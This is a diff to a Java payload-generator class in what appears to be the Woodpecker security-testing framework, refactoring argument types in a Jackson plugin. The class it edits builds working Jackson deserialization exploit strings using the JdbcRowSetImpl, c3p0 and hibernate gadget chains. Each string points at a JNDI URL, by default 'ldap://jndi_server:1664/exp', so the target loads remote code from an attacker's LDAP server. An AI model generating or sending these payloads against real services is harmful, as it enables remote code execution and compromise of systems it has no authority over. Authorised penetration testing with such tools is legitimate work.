@@ -1,6 +1,6 @@
 package me.gv7.woodpecker.vuldb.payload;
 
-import me.gv7.woodpecker.plugin.IArgs;
+import me.gv7.woodpecker.plugin.IArg;
 import me.gv7.woodpecker.plugin.IArgsUsageBinder;
 import me.gv7.woodpecker.plugin.IPayloadGenerator;
 import me.gv7.woodpecker.plugin.IResultOutput;
@@ -19,8 +19,8 @@ public class JndiInjectPayloadGenerator implements IPayloadGenerator {
 
     public IArgsUsageBinder getPayloadCustomArgs() {
         IArgsUsageBinder argsUsageBinder = JacksonVulPlugin.pluginHelper.createArgsUsageBinder();
-        List<IArgs> args = new ArrayList<IArgs>();
-        IArgs args1 = JacksonVulPlugin.pluginHelper.createArgs();
+        List<IArg> args = new ArrayList<IArg>();
+        IArg args1 = JacksonVulPlugin.pluginHelper.createArg();
         args1.setName("jndi_url");
         args1.setDescription("jndi地址");
         args1.setDefaultValue("ldap://jndi_server:1664/exp");
@@ -31,8 +31,8 @@ public class JndiInjectPayloadGenerator implements IPayloadGenerator {
     }
 
     @Override
-    public void generatorPayload(Map<String, String> customArgs, IResultOutput iResultOutput) {
-        String jndiURL = customArgs.get("jndi_url");
+    public void generatorPayload(Map<String, Object> customArgs, IResultOutput iResultOutput) {
+        String jndiURL = (String)customArgs.get("jndi_url");
         String payload1 = String.format("[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"%s\",\"autoCommit\":true}]",jndiURL);
         String payload2 = String.format("[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"%s\",\"loginTimeout\":0}]",jndiURL);
         String payload3 = String.format("{ \"id\": 1111, \"obj\": [\"org.hibernate.jmx.StatisticsService\", \"sessionFactoryJNDIName\": \"%s\"}]",jndiURL);
